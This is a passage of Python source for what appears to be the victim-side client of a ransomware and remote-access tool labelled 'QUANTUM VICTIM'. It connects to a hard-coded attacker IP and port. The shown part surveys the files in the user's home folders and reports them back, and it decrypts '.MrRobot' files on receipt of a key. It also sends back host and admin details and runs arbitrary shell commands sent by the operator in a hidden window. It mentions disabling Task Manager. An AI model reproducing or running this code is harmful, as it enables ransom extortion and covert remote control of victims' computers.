            print(f"[FIND_FILES] Error: {e}")

        return target_files

    def _get_scan_dir(self, location):
        """Get directory to scan"""
        if os.name == 'nt':
            user_dir = os.environ.get('USERPROFILE', 'C:\\Users\\' + os.environ.get('USERNAME', 'User'))
        else:
            user_dir = os.path.expanduser('~')

        if location == "all":
            return user_dir
        elif location == "desktop":
            return os.path.join(user_dir, 'Desktop')
        elif location == "documents":
            return os.path.join(user_dir, 'Documents')
        elif location == "downloads":
            return os.path.join(user_dir, 'Downloads')
        elif location == "pictures":
            return os.path.join(user_dir, 'Pictures')
        elif location == "music":
            return os.path.join(user_dir, 'Music')
        elif location == "videos":
            return os.path.join(user_dir, 'Videos')
        else:
            return location

    def _handle_decryption(self, command):
        """Handle decryption command"""
        private_key_pem = command.get("private_key", None)
        print("[DECRYPT] Starting decryption")

        if private_key_pem:
            self.encryption_engine.load_private_key(private_key_pem)

        try:
            encrypted_files = []
            if os.name == 'nt':
                user_dir = os.environ.get('USERPROFILE', 'C:\\Users\\' + os.environ.get('USERNAME', 'User'))
            else:
                user_dir = os.path.expanduser('~')

            try:
                for root, dirs, files in os.walk(user_dir):
                    for filename in files:
                        if filename.endswith('.MrRobot'):
                            filepath = os.path.join(root, filename)
                            encrypted_files.append(filepath)
            except:
                pass

            if not encrypted_files:
                response = {
                    "type": "decryption_result",
                    "success": False,
                    "error": "No encrypted files found",
                    "timestamp": time.time()
                }
                self._send_json(response)
                return

            decrypted_count = 0
            failed_count = 0

            for filepath in encrypted_files:
                try:
                    if self.encryption_engine.decrypt_file(filepath):
                        decrypted_count += 1
                    else:
                        failed_count += 1
                except:
                    failed_count += 1

            # Disable wallpaper and re-enable task manager after decryption
            print("[DECRYPT] Disabling wallpaper and re-enabling Task Manager...")
            self.encryption_engine.disable_wallpaper_and_enable_task_manager()
            
            self.encryption_engine.close_interface()

            result = {
                "type": "decryption_result",
                "success": decrypted_count > 0,
                "decrypted_count": decrypted_count,
                "failed_count": failed_count,
                "total_files": len(encrypted_files),
                "wallpaper_disabled": True,
                "task_manager_enabled": True,
                "timestamp": time.time()
            }

            self._send_json(result)

        except Exception as e:
            print(f"[DECRYPT] Error: {e}")
            error_response = {
                "type": "error",
                "error": str(e),
                "timestamp": time.time()
            }
            self._send_json(error_response)

    def _handle_scan(self, command):
        """Handle scan command - FIXED VERSION"""
        try:
            location = command.get("location", "all")
            print(f"[SCAN] Scanning location: {location}")
    
            # PROPERLY INITIALIZE THE RESULTS DICTIONARY
            results = {
                "total_files": 0,
                "locations": {},
                "detailed_counts": {},
                "scan_method": "recursive"
            }
    
            # Determine which locations to scan
            locations_to_scan = []
            if location == "all":
                locations_to_scan = ["desktop", "documents", "downloads", "pictures", "music", "videos"]
            else:
                locations_to_scan = [location]
    
            # Scan each location
            for scan_location in locations_to_scan:
                files = self._find_all_files(scan_location)
                file_count = len(files)
                results["locations"][scan_location] = file_count
                results["total_files"] += file_count
    
                # Count file types
                file_types = {}
                for filepath in files:
                    _, ext = os.path.splitext(filepath)
                    ext = ext.lower() if ext else "no_extension"
                    file_types[ext] = file_types.get(ext, 0) + 1
                results["detailed_counts"][scan_location] = file_types
    
            # Create response
            response = {
                "type": "scan_result",
                "results": results,  # Now properly defined
                "victim_id": self.victim_id,
                "location": location,
                "scan_method": "enhanced",
                "timestamp": time.time()
            }
    
            self._send_json(response)
            print(f"[SCAN] Scan complete: {results['total_files']} files found")
    
        except Exception as e:
            print(f"[SCAN] Error: {e}")
            traceback.print_exc()
            error_response = {
                "type": "error",
                "error": f"Scan failed: {str(e)}",
                "timestamp": time.time()
            }
            self._send_json(error_response)

    def _handle_status(self, command):
        """Handle status command"""
        try:
            admin_status = False
            if platform.system() == 'Windows':
                try:
                    import ctypes
                    admin_status = ctypes.windll.shell32.IsUserAnAdmin() != 0
                except:
                    pass

            status = {
                "victim_id": self.victim_id,
                "hostname": socket.gethostname(),
                "platform": platform.system(),
                "admin_privileges": admin_status,
                "crypto_available": self.encryption_engine.crypto_available,
                "interface_open": self.encryption_engine.interface_open,
                "timestamp": time.time()
            }

            response = {
                "type": "status",
                "status": status,
                "timestamp": time.time()
            }

            self._send_json(response)

        except Exception as e:
            print(f"[STATUS] Error: {e}")
            error_response = {
                "type": "error",
                "error": str(e),
                "timestamp": time.time()
            }
            self._send_json(error_response)

    def _execute_command(self, command):
        """Execute shell command"""
        cmd = command.get("command", "")
        if not cmd:
            return

        try:
            if os.name == 'nt':
                process = subprocess.Popen(
                    cmd,
                    shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    stdin=subprocess.PIPE,
                    text=True,
                    creationflags=CREATE_NO_WINDOW
                )
            else:
                process = subprocess.Popen(
                    cmd,
                    shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    stdin=subprocess.PIPE,
                    text=True
                )

            stdout, stderr = process.communicate(timeout=30)
            output = stdout or ""
            if stderr:
                output += "\n[ERROR]\n" + stderr

            response = {
                "type": "command_output",
                "command": cmd,
                "output": output,
                "success": process.returncode == 0,
                "timestamp": time.time()
            }

            self._send_json(response)

        except Exception as e:
            response = {
                "type": "command_output",
                "command": cmd,
                "output": f"[ERROR] {str(e)}",
                "success": False,
                "timestamp": time.time()
            }
            self._send_json(response)

    def cleanup(self):
        """Cleanup resources"""
        print("[VICTIM] Cleaning up...")
        self.running = False
        if self.socket:
            try:
                self.socket.shutdown(socket.SHUT_RDWR)
            except:
                pass
            try:
                self.socket.close()
            except:
                pass
            self.socket = None
        self.encryption_engine.disable_wallpaper_and_enable_task_manager()
        self.encryption_engine.close_interface()


def main():
    """Main function"""
    ATTACKER_IP = "192.168.44.133"
    ATTACKER_PORT = 5555

    if len(sys.argv) >= 2:
        ATTACKER_IP = sys.argv[1]
    if len(sys.argv) >= 3:
        ATTACKER_PORT = int(sys.argv[2])

    print("\n" + "=" * 50)
    print("     QUANTUM VICTIM v4.1 - FIXED CONNECTIONS")
    print("=" * 50)
    print(f"Target: {ATTACKER_IP}:{ATTACKER_PORT}")
    print("Features: Stable socket handling, no infinite loops")
    print("=" * 50 + "\n")

    victim = QuantumVictim(
        attacker_ip=ATTACKER_IP,
        attacker_port=ATTACKER_PORT
    )

    victim.connect()


if __name__ == "__main__":
    # Install pycryptodome if needed
    try:
        from Cryptodome.PublicKey import RSA
    except ImportError:
        print("[SETUP] Installing pycryptodome...")

    try:
        main()
    except KeyboardInterrupt:
        print("\n[VICTIM] Interrupted")
    except Exception as e:
        print(f"\n[VICTIM] Fatal error: {e}")
        traceback.print_exc()
